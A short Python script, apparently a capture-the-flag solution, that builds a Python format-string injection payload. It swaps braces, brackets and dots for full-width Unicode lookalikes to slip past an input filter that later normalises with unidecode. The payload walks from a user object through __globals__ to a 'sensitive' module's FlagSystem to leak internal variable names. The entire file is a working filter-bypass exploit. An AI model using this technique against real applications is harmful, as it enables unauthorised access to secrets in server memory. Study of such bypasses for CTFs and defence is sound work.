import re
import unidecode


def generate_payload(primary_payload: str) -> str:
    payload = primary_payload.replace("{", "｛").replace(
        "}", "｝").replace("[", "［").replace("]", "］").replace(".", "․")

    if unidecode.unidecode(payload) == primary_payload:
        print("Payload")
        print(payload)
        return payload
    else:
        print("Error: Payload contains non-ASCII characters")


main_payload = "{user.__class__.__init__.__globals__[sensitive].FlagSystem.__init__.__code__.co_varnames}"

generate_payload(main_payload)
